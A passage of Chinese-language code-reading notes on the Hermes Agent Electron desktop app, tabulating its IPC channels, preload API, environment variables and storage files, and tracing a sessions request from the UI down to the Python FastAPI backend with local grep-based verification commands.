| 60 | `hermes:keep-awake` | on | `hermesDesktop.setKeepAwake` | `apps/desktop/electron/main.ts:10672` | 开关"保持唤醒"(powerSaveBlocker) |
| 61 | `hermes:logs:recent` | handle | `hermesDesktop.getRecentLogs` | `apps/desktop/electron/main.ts:10883` | 取最近 200 行桌面日志 |
| 62 | `hermes:logs:reveal` | handle | `hermesDesktop.revealLogs` | `apps/desktop/electron/main.ts:10867` | 在文件管理器里定位 desktop.log |
| 63 | `hermes:native-theme` | on | `hermesDesktop.setNativeTheme` | `apps/desktop/electron/main.ts:10629` | 设置系统主题跟随(dark/light/system)并持久化 |
| 64 | `hermes:normalizePreviewTarget` | handle | `hermesDesktop.normalizePreviewTarget` | `apps/desktop/electron/main.ts:10573` | 把用户给的预览目标(相对路径/URL/~)归一化 |
| 65 | `hermes:notify` | handle | `hermesDesktop.notify` | `apps/desktop/electron/main.ts:10330` | 发一条系统通知(跨窗口去重) |
| 66 | `hermes:openExternal` | handle | `hermesDesktop.openExternal` | `apps/desktop/electron/main.ts:10756` | 用系统默认程序打开链接/文件(协议白名单 http/https/mailto/file) |
| 67 | `hermes:openPreviewInBrowser` | handle | `hermesDesktop.openPreviewInBrowser` | `apps/desktop/electron/main.ts:10817` | 把预览目标丢给系统浏览器 |
| 68 | `hermes:pet-overlay:close` | handle | `hermesDesktop.petOverlay.close` | `apps/desktop/electron/main.ts:9611` | 关吉祥物悬浮窗 |
| 69 | `hermes:pet-overlay:control` | on | `hermesDesktop.petOverlay.control` | `apps/desktop/electron/main.ts:9673` | 悬浮窗 → 主进程 → 主渲染进程:回弹/提交(中继) |
| 70 | `hermes:pet-overlay:ignore-mouse` | on | `hermesDesktop.petOverlay.setIgnoreMouse` | `apps/desktop/electron/main.ts:9646` | 让悬浮窗穿透鼠标 |
| 71 | `hermes:pet-overlay:open` | handle | `hermesDesktop.petOverlay.open` | `apps/desktop/electron/main.ts:9588` | 开吉祥物悬浮窗,返回它实际落到的屏幕坐标 |
| 72 | `hermes:pet-overlay:set-bounds` | on | `hermesDesktop.petOverlay.setBounds` | `apps/desktop/electron/main.ts:9622` | 拖动中更新悬浮窗位置 |
| 73 | `hermes:pet-overlay:set-focusable` | on | `hermesDesktop.petOverlay.setFocusable` | `apps/desktop/electron/main.ts:9655` | 悬浮窗需要键盘输入时临时可聚焦 |
| 74 | `hermes:pet-overlay:state` | on | `hermesDesktop.petOverlay.pushState` | `apps/desktop/electron/main.ts:9667` | 主渲染进程 → 主进程 → 悬浮窗:推最新宠物状态(中继) |
| 75 | `hermes:power-battery:get` | handle | `hermesDesktop.getOnBattery` | `apps/desktop/electron/main.ts:5269` | 当前是否在用电池(渲染层据此放慢兜底轮询) |
| 76 | `hermes:previewShortcutActive` | on | `hermesDesktop.setPreviewShortcutActive` | `apps/desktop/electron/main.ts:10002` | 告诉主进程预览快捷键此刻是否该生效 |
| 77 | `hermes:profile:get` | handle | `hermesDesktop.profile.get` | `apps/desktop/electron/main.ts:9989` | 读当前桌面 profile |
| 78 | `hermes:profile:set` | handle | `hermesDesktop.profile.set` | `apps/desktop/electron/main.ts:9990` | 切桌面 profile(硬换家) |
| 79 | `hermes:quick-entry:dismiss` | on | `hermesDesktop.quickEntry.dismiss` | `apps/desktop/electron/main.ts:10754` | 收起 Quick Entry 窗口 |
| 80 | `hermes:quick-entry:settings:get` | handle | `hermesDesktop.quickEntry.getSettings` | `apps/desktop/electron/main.ts:10689` | 读 Quick Entry 设置(含全局热键注册是否成功) |
| 81 | `hermes:quick-entry:settings:set` | handle | `hermesDesktop.quickEntry.setSettings` | `apps/desktop/electron/main.ts:10703` | 改 Quick Entry 设置并重注册全局热键 |
| 82 | `hermes:quick-entry:state` | on | `hermesDesktop.quickEntry.pushState` | `apps/desktop/electron/main.ts:10746` | 主渲染进程把连接状态/会话候选推给 Quick Entry 窗口(中继) |
| 83 | `hermes:quick-entry:submit` | on | `hermesDesktop.quickEntry.submit` | `apps/desktop/electron/main.ts:10720` | Quick Entry 窗口提交文本 → 转发给主渲染进程(中继) |
| 84 | `hermes:readClipboard` | handle | `hermesDesktop.readClipboard` | `apps/desktop/electron/main.ts:10536` | 读剪贴板文本(渲染层在 overlay 聚焦时读不到) |
| 85 | `hermes:readFileDataUrl` | handle | `hermesDesktop.readFileDataUrl` | `apps/desktop/electron/main.ts:10428` | 读文件为 data URL(预览用,受上限与敏感文件黑名单约束) |
| 86 | `hermes:readFileDataUrlForAttach` | handle | `hermesDesktop.readFileDataUrlForAttach` | `apps/desktop/electron/main.ts:10440` | 读文件为 data URL(附件上传专用,上限 256 MiB) |
| 87 | `hermes:readFileText` | handle | `hermesDesktop.readFileText` | `apps/desktop/electron/main.ts:10448` | 读文本文件(带语言识别、二进制探测、截断标记) |
| 88 | `hermes:requestMicrophoneAccess` | handle | `hermesDesktop.requestMicrophoneAccess` | `apps/desktop/electron/main.ts:10006` | 请求 macOS 麦克风权限 |
| 89 | `hermes:saveClipboardImage` | handle | `hermesDesktop.saveClipboardImage` | `apps/desktop/electron/main.ts:10552` | 把剪贴板图片存成文件(WSL 下走 PowerShell 取宿主剪贴板) |
| 90 | `hermes:saveImageBuffer` | handle | `hermesDesktop.saveImageBuffer` | `apps/desktop/electron/main.ts:10540` | 把渲染层给的字节存成图片文件 |
| 91 | `hermes:saveImageFromUrl` | handle | `hermesDesktop.saveImageFromUrl` | `apps/desktop/electron/main.ts:10538` | 把 URL 图片存到 composer 图片目录 |
| 92 | `hermes:selectPaths` | handle | `hermesDesktop.selectPaths` | `apps/desktop/electron/main.ts:10476` | 原生打开对话框选文件/目录 |
| 93 | `hermes:selectSavePath` | handle | `hermesDesktop.selectSavePath` | `apps/desktop/electron/main.ts:10518` | 原生保存对话框选路径(只选路径,不写) |
| 94 | `hermes:setting:defaultProjectDir:get` | handle | `hermesDesktop.settings.getDefaultProjectDir` | `apps/desktop/electron/main.ts:10827` | 读默认项目目录 |
| 95 | `hermes:setting:defaultProjectDir:pick` | handle | `hermesDesktop.settings.pickDefaultProjectDir` | `apps/desktop/electron/main.ts:10851` | 弹目录选择器挑默认项目目录 |
| 96 | `hermes:setting:defaultProjectDir:set` | handle | `hermesDesktop.settings.setDefaultProjectDir` | `apps/desktop/electron/main.ts:10835` | 写默认项目目录 |
| 97 | `hermes:ssh-config:hosts` | handle | `hermesDesktop.sshConfigHosts` | `apps/desktop/electron/main.ts:9798` | 列 ~/.ssh/config 里的 Host 别名 |
| 98 | `hermes:ssh-config:resolve` | handle | `hermesDesktop.sshResolveHost` | `apps/desktop/electron/main.ts:9799` | 对某个 host 跑 ssh -G 解析出实际参数 |
| 99 | `hermes:stop-find-in-page` | handle | `hermesDesktop.stopFindInPage` | `apps/desktop/electron/main.ts:10807` | 停止页内查找 |
| 100 | `hermes:stopPreviewFileWatch` | handle | `hermesDesktop.stopPreviewFileWatch` | `apps/desktop/electron/main.ts:10581` | 停掉某个监听 |
| 101 | `hermes:terminal:cwd` | handle | `hermesDesktop.terminal.cwd` | `apps/desktop/electron/main.ts:11396` | 读终端子进程当前工作目录(POSIX 才有) |
| 102 | `hermes:terminal:dispose` | handle | `hermesDesktop.terminal.dispose` | `apps/desktop/electron/main.ts:11406` | 关掉终端并杀 PTY |
| 103 | `hermes:terminal:resize` | handle | `hermesDesktop.terminal.resize` | `apps/desktop/electron/main.ts:11382` | 改终端行列 |
| 104 | `hermes:terminal:start` | handle | `hermesDesktop.terminal.start` | `apps/desktop/electron/main.ts:11318` | 起一个 PTY 终端(本地 shell 或 ssh 到远端),返回 id |
| 105 | `hermes:terminal:write` | handle | `hermesDesktop.terminal.write` | `apps/desktop/electron/main.ts:11370` | 往终端写输入 |
| 106 | `hermes:titlebar-theme` | on | `hermesDesktop.setTitleBarTheme` | `apps/desktop/electron/main.ts:10610` | 渲染层把标题栏配色推给原生覆盖层 |
| 107 | `hermes:translucency` | on | `hermesDesktop.setTranslucency` | `apps/desktop/electron/main.ts:10642` | 设置窗口半透明强度并持久化 |
| 108 | `hermes:uninstall:run` | handle | `hermesDesktop.uninstall.run` | `apps/desktop/electron/main.ts:11690` | 执行卸载(三档) |
| 109 | `hermes:uninstall:summary` | handle | `hermesDesktop.uninstall.summary` | `apps/desktop/electron/main.ts:11689` | 卸载前的只读摘要(哪些东西装了) |
| 110 | `hermes:updates:apply` | handle | `hermesDesktop.updates.apply` | `apps/desktop/electron/main.ts:11418` | 执行更新 |
| 111 | `hermes:updates:branch:get` | handle | `hermesDesktop.updates.getBranch` | `apps/desktop/electron/main.ts:11426` | 读更新分支设置 |
| 112 | `hermes:updates:branch:set` | handle | `hermesDesktop.updates.setBranch` | `apps/desktop/electron/main.ts:11428` | 写更新分支设置 |
| 113 | `hermes:updates:check` | handle | `hermesDesktop.updates.check` | `apps/desktop/electron/main.ts:11408` | 检查更新(git fetch / ls-remote) |
| 114 | `hermes:version` | handle | `hermesDesktop.getVersion` | `apps/desktop/electron/main.ts:11473` | 版本信息(Hermes 版本取自源码树的 __version__,不是 Electron 包版本) |
| 115 | `hermes:vscode-theme:fetch` | handle | `hermesDesktop.themes.fetchMarketplace` | `apps/desktop/electron/main.ts:11698` | 按扩展 id 拉 VS Code 市场主题 |
| 116 | `hermes:vscode-theme:search` | handle | `hermesDesktop.themes.searchMarketplace` | `apps/desktop/electron/main.ts:11701` | 搜 VS Code 市场主题 |
| 117 | `hermes:wake-indicator:get` | handle | `hermesDesktop.wakeIndicator.getState` | `apps/desktop/electron/main.ts:9557` | 读唤醒词指示器状态 |
| 118 | `hermes:wake-indicator:set` | on | `hermesDesktop.wakeIndicator.setState` | `apps/desktop/electron/main.ts:9558` | 写唤醒词指示器状态(hidden/detected/capturing) |
| 119 | `hermes:watchDirectory` | handle | `hermesDesktop.watchDirectory` | `apps/desktop/electron/main.ts:10579` | 监听一个目录的变化 |
| 120 | `hermes:watchPreviewFile` | handle | `hermesDesktop.watchPreviewFile` | `apps/desktop/electron/main.ts:10577` | 监听单个预览文件的变化 |
| 121 | `hermes:window:openInstance` | handle | `hermesDesktop.openWindow` | `apps/desktop/electron/main.ts:9552` | 开一个完整的新实例窗口 |
| 122 | `hermes:window:openSession` | handle | `hermesDesktop.openSessionWindow` | `apps/desktop/electron/main.ts:9543` | 为某个会话开一个二级窗口 |
| 123 | `hermes:workspace:sanitize` | handle | `hermesDesktop.sanitizeWorkspaceCwd` | `apps/desktop/electron/main.ts:10833` | 清洗一个工作目录(拒绝落在安装包内等) |
| 124 | `hermes:writeClipboard` | handle | `hermesDesktop.writeClipboard` | `apps/desktop/electron/main.ts:10510` | 写剪贴板文本 |
| 125 | `hermes:zoom:get` | handle | `hermesDesktop.zoom.get` | `apps/desktop/electron/main.ts:9565` | 读发起窗口当前缩放 |
| 126 | `hermes:zoom:set-percent` | on | `hermesDesktop.zoom.setPercent` | `apps/desktop/electron/main.ts:9572` | 设发起窗口缩放并持久化 |

> 注:`hermes:get-remote-display-reason` 注册在 `main.ts:430`,**远早于 `app.whenReady()`**
> ——它只读一个模块级常量,不依赖 app 生命周期。这是全表唯一一条在文件前 500 行注册的通道。


### 3.2 主进程 → 渲染进程:23 条推送通道

其中 4 条(`hermes:pet-overlay:state`、`hermes:pet-overlay:control`、`hermes:quick-entry:state`、
`hermes:quick-entry:submit`)是**中继**:一个渲染进程 `send` 给主进程,主进程转发给另一个渲染进程
(主窗口 ↔ 悬浮窗 / Quick Entry 窗)。所以它们同时出现在 3.1 的 `on` 里。

```verify
cd /home/user/hermes-agent && grep -oE "ipcRenderer\.on\(\s*'[^']+'" apps/desktop/electron/preload.ts \
  | sed -E "s/.*'([^']+)'/\1/" | sort -u | tee /dev/stderr | wc -l
```

| # | 通道名 | 发送处 | 含义 |
|---:|---|---|---|
| 1 | `hermes:backend-exit` | `apps/desktop/electron/main.ts:5195` | 后端子进程退出(带 code/signal/error) |
| 2 | `hermes:boot-progress` | `apps/desktop/electron/main.ts:1466` | 启动进度推送(phase/message/progress/running/error) |
| 3 | `hermes:bootstrap:event` | `apps/desktop/electron/main.ts:1515` | 首启安装事件流(见 3.5) |
| 4 | `hermes:close-preview-requested` | `apps/desktop/electron/main.ts:5215` | 菜单/快捷键要求关预览 |
| 5 | `hermes:connection:applied` | `apps/desktop/electron/main.ts:7957` | 软换家完成,渲染层清空网关态并重连 |
| 6 | `hermes:deep-link` | `apps/desktop/electron/main.ts:11757` | 投递一条 `hermes://` 深链 |
| 7 | `hermes:focus-session` | `apps/desktop/electron/main.ts:10362` | 用户点了通知,聚焦到某会话 |
| 8 | `hermes:found-in-page` | `apps/desktop/electron/find-in-page.ts:112` | 页内查找结果(命中数/当前序号) |
| 9 | `hermes:notification-action` | `apps/desktop/electron/main.ts:10373` | 通知上的按钮被点了(仅 macOS 签名包会渲染按钮) |
| 10 | `hermes:open-folder-requested` | `apps/desktop/electron/main.ts:5229` | 菜单要求打开文件夹 |
| 11 | `hermes:open-updates` | `apps/desktop/electron/main.ts:5312` | 菜单要求打开更新面板 |
| 12 | `hermes:pet-overlay:control` | `apps/desktop/electron/main.ts:8999` | 中继:悬浮窗 → 主渲染进程 |
| 13 | `hermes:pet-overlay:state` | `apps/desktop/electron/main.ts:9667` | 中继:主渲染进程 → 悬浮窗 |
| 14 | `hermes:power-battery` | `apps/desktop/electron/main.ts:5271` | 交流/电池切换 |
| 15 | `hermes:power-resume` | `apps/desktop/electron/main.ts:5246` | 系统从睡眠唤醒 |
| 16 | `hermes:preview-file-changed` | `apps/desktop/electron/main.ts:4975` | 被监听的预览文件变了 |
| 17 | `hermes:quick-entry:shown` | `apps/desktop/electron/main.ts:9171` | Quick Entry 窗被召唤(清草稿、重聚焦) |
| 18 | `hermes:quick-entry:state` | `apps/desktop/electron/main.ts:9151` | 中继:连接状态 + 会话候选 → Quick Entry 窗 |
| 19 | `hermes:quick-entry:submit` | `apps/desktop/electron/main.ts:10720` | 中继:Quick Entry 提交 → 主渲染进程 |
| 20 | `hermes:updates:progress` | `apps/desktop/electron/main.ts:2428` | 更新进度 |
| 21 | `hermes:wake-indicator:state` | `apps/desktop/electron/wake-indicator-window.ts:57` | 唤醒指示器状态 → 指示器窗 |
| 22 | `hermes:window-state-changed` | `apps/desktop/electron/main.ts:5335` | 窗口最大化/全屏状态变化 |
| 23 | `hermes:zoom:changed` | `apps/desktop/electron/zoom.ts:55` | 缩放变了(含键盘快捷键触发的) |

### 3.3 动态通道族(2 族)

终端每开一个会话就生出两条以 UUID 命名的通道。它们不在上面 145 条静态名里,
因为通道名在运行时才存在。

`apps/desktop/electron/main.ts:11013-11015 @ 863e313`

```ts
function terminalChannel(id, suffix) {
  return `hermes:terminal:${id}:${suffix}`
}
```

- `hermes:terminal:<uuid>:data` —— PTY 输出
- `hermes:terminal:<uuid>:exit` —— PTY 退出({ code, signal })

渲染侧的订阅入口在 `hermesDesktop.terminal.onData(id, cb)` / `onExit(id, cb)`。


### 3.4 preload `contextBridge` 暴露面:152 个叶函数 / 94 个顶层键

全片只有一处 `contextBridge`,只暴露一个全局 `window.hermesDesktop`。

`apps/desktop/electron/preload.ts:1-10 @ 863e313`

```ts
import { contextBridge, ipcRenderer, webUtils } from 'electron'

contextBridge.exposeInMainWorld('hermesDesktop', {
  getConnection: profile => ipcRenderer.invoke('hermes:connection', profile),
  revalidateConnection: () => ipcRenderer.invoke('hermes:connection:revalidate'),
  touchBackend: profile => ipcRenderer.invoke('hermes:backend:touch', profile),
  getGatewayWsUrl: profile => ipcRenderer.invoke('hermes:gateway:ws-url', profile),
  openSessionWindow: (sessionId, opts) => ipcRenderer.invoke('hermes:window:openSession', sessionId, opts),
  openWindow: () => ipcRenderer.invoke('hermes:window:openInstance'),
  claimAmbientCue: key => ipcRenderer.invoke('hermes:ambient:claim', key),
```


搜索面(证明"只有这一处"):在 `apps/desktop/electron/*.ts` 里 grep `contextBridge|exposeInMainWorld`,
排除 `*.test.ts`,只有 `preload.ts:1`(import)与 `preload.ts:3`(唯一一次 `exposeInMainWorld`)两处命中。

```verify
cd /home/user/hermes-agent && grep -rn "contextBridge\|exposeInMainWorld" apps/desktop/electron/*.ts | grep -v "\.test\.ts:"
```

机械枚举叶函数(152)与顶层键(94):

```verify
cd /home/user/hermes-agent && python3 - <<'EOF'
import re
src = open('apps/desktop/electron/preload.ts').read().splitlines()
start = next(i for i,l in enumerate(src) if 'exposeInMainWorld' in l)
stack, out = [], []
for i in range(start+1, len(src)):
    line = src[i]; s = line.strip()
    if not s or s.startswith('//'): continue
    ind = len(line) - len(line.lstrip())
    while stack and ind <= stack[-1][0]: stack.pop()
    m = re.match(r'^([A-Za-z_$][\w$]*)\s*:\s*(.*)$', s)
    if not m: continue
    name, rest = m.group(1), m.group(2)
    path = '.'.join([n for _, n in stack] + [name])
    if rest.rstrip().endswith('{') and '=>' not in rest: stack.append((ind, name))
    else: out.append(path)
print("leaves:", len(out), " top-level keys:", len({p.split('.')[0] for p in out}))
for p in out: print(" ", p)
EOF
```

13 个命名空间对象(其余 81 个顶层键是扁平函数):
`wakeIndicator`(3)、`petOverlay`(9)、`quickEntry`(8)、`cloud`(5)、`profile`(2)、
`dataUrlReadMax`(2)、`settings`(3)、`zoom`(3)、`git`(9 + `git.review` 11)、
`terminal`(7)、`uninstall`(2)、`updates`(5)、`themes`(2)。

152 个叶函数按职能分三类:
- **126 个是 IPC 直通**(110 `invoke` + 16 `send`),与 3.1 表一一对应;
- **23 个是订阅器**(`on*` / `onXxx`),内部 `ipcRenderer.on` 并**返回退订函数**——
  preload 从不留下无法解绑的监听器;
- **3 个既不 invoke 也不 send**:`getPathForFile`(`webUtils.getPathForFile`,把拖入的
  File 对象换成磁盘路径)、`terminal.onData`、`terminal.onExit`(动态通道订阅)。
  其中 `getPathForFile` 是**唯一一个不经过主进程、直接在 preload 里调 Electron API 的暴露项**。

`apps/desktop/electron/preload.ts:124-130 @ 863e313`

```ts
  getPathForFile: file => {
    try {
      return webUtils.getPathForFile(file) || ''
    } catch {
      return ''
    }
  },
```


### 3.5 bootstrap 事件类型:8 种

`bootstrap-runner.ts` 的模块头文档只列了 5 种;主进程自己又发 2 种、还处理 1 种它自己不发的。

| 事件 type | 谁发 | 处理处 | 含义 |
|---|---|---|---|
| `manifest` | bootstrap-runner + main.ts | `apps/desktop/electron/main.ts:1516` | 安装阶段清单(name/title/category/needs_user_input) |
| `stage` | bootstrap-runner | `apps/desktop/electron/main.ts:1526` | 单阶段状态(running/succeeded/skipped/failed) |
| `log` | bootstrap-runner | `apps/desktop/electron/main.ts:1533` | 安装脚本原始输出行(环形缓冲 500 条) |
| `complete` | bootstrap-runner | `apps/desktop/electron/main.ts:1541` | 安装完成,附写入的 marker |
| `failed` | bootstrap-runner | `apps/desktop/electron/main.ts:1545` | 安装失败/被取消 |
| `unsupported-platform` | **无人发**(见 §6 ■-4) | `apps/desktop/electron/main.ts:1548` | 平台不支持自动安装 |
| `setup-choice` | main.ts | `apps/desktop/electron/main.ts:1557` | 首启选择门开/关 |
| `dismissed` | main.ts | `apps/desktop/electron/main.ts:1569` | 首启选择门被"远端应用"路径撤下 |

```verify
cd /home/user/hermes-agent && grep -n "ev.type === '" apps/desktop/electron/main.ts | sed -n '1,12p'
```

### 3.6 boot 进度 phase:12 个

这是渲染层启动覆盖层唯一的状态机输入。

```verify
cd /home/user/hermes-agent && grep -ohE "(advanceBootProgress\('|phase: ')[a-z][a-z.-]*" apps/desktop/electron/main.ts \
  | sed -E "s/.*'//" | sort -u | tee /dev/stderr | wc -l
```

`idle` → `bootstrap.choice` → `backend.resolve` → `backend.runtime` → `runtime.external` /
`runtime.ready` → `backend.remote`(远端分支)/ `backend.spawn` → `backend.port` →
`backend.wait` → `backend.ready`;任何一步失败落到 `backend.error`。

### 3.7 本片读取的 `HERMES_*` 环境变量:28 个

```verify
cd /home/user/hermes-agent && for f in $(ls apps/desktop/electron/*.ts | grep -v '\.test\.ts$'); do \
  grep -ohE "(env\.|env\?\.|process\.env\.)(HERMES_[A-Z0-9_]+)|env\[['\"](HERMES_[A-Z0-9_]+)['\"]\]" "$f"; \
done | grep -oE "HERMES_[A-Z0-9_]+" | sort -u | tee /dev/stderr | wc -l
```

`HERMES_HOME`、`HERMES_GIT_BASH_PATH`、`HERMES_PORTAL_BASE_URL`、`HERMES_PROBE_TIMEOUT_MS`,
以及 24 个 `HERMES_DESKTOP_*`:`APP_NAME`、`BOOT_FAKE`、`BOOT_FAKE_ERROR`、`BOOT_FAKE_STEP_MS`、
`CDP_PORT`、`CHILD_PID`、`CWD`、`DEV_SERVER`、`DISABLE_GPU`、`HERMES`、`HERMES_ROOT`、
`IGNORE_EXISTING`、`IS_PACKAGED`、`POOL_IDLE_MS`、`POOL_MAX`、`PORT_ANNOUNCE_TIMEOUT_MS`、
`PYTHON`、`REMOTE_TOKEN`、`REMOTE_URL`、`SHELL`、`SKIP_QUIT_CONFIRM`、`TERMINAL`、
`USER_DATA_DIR`、`WEB_DIST`。

其中 **17 个在 `website/docs/reference/environment-variables.md` 里查不到**(见 §6 ◇-1)。

### 3.8 落盘位置:15 个 userData 条目 + 4 个 HERMES_HOME 条目

userData(macOS `~/Library/Application Support/Hermes`,可被 `HERMES_DESKTOP_USER_DATA_DIR` 覆盖):

```verify
cd /home/user/hermes-agent && grep -nE "path\.join\(app\.getPath\('userData'\)" apps/desktop/electron/main.ts | tee /dev/stderr | wc -l
```

| 文件/目录 | 定义处 | 内容 |
|---|---|---|
| `connection.json` | `apps/desktop/electron/main.ts:607` | 连接配置(远端 token 经 safeStorage 加密) |
| `desktop-installation.json` | `apps/desktop/electron/main.ts:608` | 本机安装 ID |
| `updates.json` | `apps/desktop/electron/main.ts:609` | 更新分支 |
| `window-state.json` | `apps/desktop/electron/main.ts:610` | 主窗口几何 |
| `active-profile.json` | `apps/desktop/electron/main.ts:617` | 当前桌面 profile |
| `native-theme.json` | `apps/desktop/electron/main.ts:706` | 主题跟随设置 |
| `translucency.json` | `apps/desktop/electron/main.ts:739` | 半透明强度 |
| `backend-ready/`(目录) | `apps/desktop/electron/main.ts:2215` | 后端端口公告的临时 ready 文件 |
| `zoom-state.json` | `apps/desktop/electron/main.ts:2356` | 缩放级别 |
| `project-dir.json` | `apps/desktop/electron/main.ts:3790` | 默认项目目录 |
| `composer-images/`(目录) | `apps/desktop/electron/main.ts:4856` | 从剪贴板/URL 存下的合成器图片 |
| `native-oauth-tokens.json` | `apps/desktop/electron/main.ts:6294` | RFC 8252 原生 token(safeStorage 加密) |
| `quick-entry.json` | `apps/desktop/electron/main.ts:9049` | Quick Entry 设置 |
| `data-url-read-max.json` | `apps/desktop/electron/main.ts:10385` | data-URL 读取上限 |
| `keep-awake.json` | `apps/desktop/electron/main.ts:10661` | 保持唤醒开关 |

HERMES_HOME 侧:`hermes-agent/`(活动运行时)、`hermes-agent/venv/`、
`hermes-agent/.hermes-bootstrap-complete`(首启 marker)、`logs/desktop.log`。
另外 Windows 沙箱回退 marker 也写在 userData 下(`windows-sandbox-fallback.ts` 的
`readSandboxMarker`/`writeSandboxMarker`,由 `main.ts` 传入 `app.getPath('userData')`)。


## §4 端到端链:侧边栏点开会话列表,一路走到 Python

选一条本片能全程带锚点、并且真的跨出 Electron 进到 Python 内核的链。
每一跳都给锚点;跨出本片的两端写清接到谁。

**跳 0(片外,渲染层)**:React 侧边栏调 `window.hermesDesktop.api({ path: '/api/sessions?limit=20', method: 'GET' })`。
本片不看渲染层代码,只知道这个入口的形状——因为它就是 preload 暴露的那个函数。

**跳 1:preload 转 IPC。**

`apps/desktop/electron/preload.ts:107 @ 863e313`

```ts
  api: request => ipcRenderer.invoke('hermes:api', request),
```


**跳 2:主进程接住,先问"这个请求该不该改道到远端 profile"。**
`interceptSessionRequestForRemote` 只对 `/api/profiles/sessions` 与
`/api/profiles/sessions/sidebar` 两条路径做改道;`/api/sessions` 不匹配,返回 `undefined` 走本地快路。

`apps/desktop/electron/main.ts:10023-10026 @ 863e313`

```ts
async function interceptSessionRequestForRemote(request) {
  if (typeof request?.path !== 'string') {
    return undefined
  }
```


**跳 3:解析要用哪个后端。** `ensureBackend` 按 profile 路由表决定走"主后端"还是"池后端";
主后端就调 `startHermes()`。

`apps/desktop/electron/main.ts:8021-8026 @ 863e313`

```ts
async function ensureBackend(profile) {
  const key = profile && String(profile).trim() ? String(profile).trim() : primaryProfileKey()
  const route = resolveProfileBackendRoute(key, profileRouteOptions(key))

  if (route.backend === 'primary') {
    const connection = await startHermes()
```


**跳 4:`startHermes` 拉起 Python 子进程。** 命令与参数来自 `resolveHermesBackend` 的六级梯子
(见 §5.1),环境变量在这里被钉死:

`apps/desktop/electron/main.ts:8497-8506 @ 863e313`

```ts
          // can't reliably do that, so we set it inline for every spawn.
          HERMES_HOME,
          ...backend.env,
          TERMINAL_CWD: hermesCwd,
          HERMES_DASHBOARD_SESSION_TOKEN: token,
          // Marks this dashboard backend as desktop-spawned so it runs the cron
          // scheduler tick loop (the gateway isn't running under the app).
          HERMES_DESKTOP: '1',
          HERMES_WEB_DIST: webDist,
          ...(readyFile ? { HERMES_DESKTOP_READY_FILE: readyFile } : {})
```


**跳 5:等 Python 宣告端口。** 子进程 stdout 上那一行 READY 就是握手信号:

`apps/desktop/electron/backend-ready.ts:3-6 @ 863e313`

```ts
// `hermes serve` announces HERMES_BACKEND_READY; the legacy `hermes dashboard`
// backend announces HERMES_DASHBOARD_READY. Accept either so the desktop spawn
// works against both the headless backend and old/dashboard runtimes.
const _READY_RE = /^HERMES_(?:BACKEND|DASHBOARD)_READY port=(\d+)/m
```


**跳 5'(Python 侧,片外但必须点名接到谁):** 这一行由 `hermes_cli/web_server.py` 在 uvicorn
真正 bind 之后打印。`serve` 是 headless,打 `HERMES_BACKEND_READY`;老的 `dashboard` 打
`HERMES_DASHBOARD_READY`。桌面两个都认。

`hermes_cli/web_server.py:17635-17636 @ 863e313`

```python
            ready_token = "HERMES_BACKEND_READY" if headless else "HERMES_DASHBOARD_READY"
            print(f"{ready_token} port={actual_port}", flush=True)
```


**跳 6:拿到端口后做三重就绪确认,而不是"能连上就算好"。**

`apps/desktop/electron/main.ts:8583-8599 @ 863e313`

```ts
    await advanceBootProgress('backend.port', 'Waiting for Hermes backend to launch', 86)

    // Discover the ephemeral port the child bound to
    const port = await Promise.race([
      waitForDashboardPortAnnouncement(hermesProcess, { readyFile }),
      backendStartFailed
    ])

    if (readyFile) {
      fs.unlink(readyFile, () => {})
    }

    const baseUrl = `http://127.0.0.1:${port}`
    await advanceBootProgress('backend.wait', 'Waiting for Hermes backend to become ready', 90)
    await Promise.race([waitForHermes(baseUrl, token), backendStartFailed])
    backendReady = true
    backendStartFailure = null
```


三重是:(a) HTTP `/api/health`(`waitForHermes`);(b) `adoptServedDashboardToken` —— 抓后端首页里
注入的 token,和我们 spawn 时给的比对;(c) `probeGatewayWebSocket` —— **真开一次 `/api/ws`**。
第三步存在的理由是 HTTP 通而 WS 被拒是个真实故障形态(`gateway-ws-probe.ts` 的模块头把它写成了
"Test remote 说连上了但什么都不能用"的假阳性)。

**跳 7:发 REST 请求。** URL 由 baseUrl 与调用方给的 path 拼接:

`apps/desktop/electron/main.ts:10272-10274 @ 863e313`

```ts
  const requestPath = pathWithGlobalRemoteProfile(request.path, profile, profileRouteOptions(profile))

  const url = `${connection.baseUrl}${requestPath}`
```


**跳 8:`fetchJson` 带上 `X-Hermes-Session-Token` 头发出去**(`apps/desktop/electron/main.ts:4242`),
Python 侧由 `hermes_cli/web_server.py:335` 的 `_SESSION_HEADER_NAME` 校验。

**跳 9(Python 侧,接到谁):** 路由落在 FastAPI 的

`hermes_cli/web_routers/sessions.py:50-51 @ 863e313`

```python
@list_router.get("/api/sessions")
def get_sessions(
```


**跳 10:回程。** `fetchJson` 解析 JSON 后 resolve,IPC 把它序列化回渲染进程,preload 的
Promise 兑现,React 更新列表。回程上有一处值得记的防御:2xx 但正文是 HTML 意味着请求掉进了
SPA 的 catch-all(通常是打到了一个不存在的 `/api` 路径),`fetchJson` 会给出带 URL 的明确错误,
而不是抛 `Unexpected token '<'`。


## §5 逐机制结构笔记

### 5.1 后端生命周期:从"找一个能跑的 Python"到"它死了怎么办"

#### (a) 找运行时 —— 六级梯子,每一级都要过探针

`resolveHermesBackend`(`apps/desktop/electron/main.ts:3876`)是一条"首个命中即返回"的梯子:

| 级 | 候选 | 验证方式 |
|---:|---|---|
| 1 | `HERMES_DESKTOP_HERMES_ROOT` 指的源码树 | `isHermesSourceRoot` + 能找到 python |
| 2 | 开发态(非打包)的当前 checkout `SOURCE_REPO_ROOT` | 同上 |
| 3 | 托管安装 `HERMES_HOME/hermes-agent` | `isActiveRuntimeUsable()`:源码树 + venv python 存在 + **能 import** |
| 4 | `HERMES_DESKTOP_HERMES` 覆盖,否则 PATH 上的 `hermes` | `verifyHermesCli`(`--version`);**但显式覆盖跳过探针** |
| 5 | 系统 Python + 已 pip 装的 `hermes_cli` | `canImportHermesCli` |
| 6 | 都不行 → `kind: 'bootstrap-needed'` 哨兵,交给安装器 | —— |

这条梯子的设计要点是 **"存在不等于可用"**:第 4/5 级历史上只检查文件存在,结果一个半卸载的
`hermes.cmd` shim、或者一个装了 Python 但没装 `hermes_cli` 的开发机,都会让解析器返回一个
spawn 就死的后端,用户看到 `ModuleNotFoundError` 而不是首启安装界面。探针就是补这个洞的:

`apps/desktop/electron/backend-probes.ts:122-124 @ 863e313`

```ts
function hermesRuntimeImportProbe() {
  return 'import yaml; import dotenv; import hermes_cli.config'
}
```

探到 `hermes_cli.config` 而不是顶层包,是因为一个坏掉的 Windows venv 能通过 PYTHONPATH 看见源码树
却缺 PyYAML,顶层 import 会过、第一次真 import 才炸。

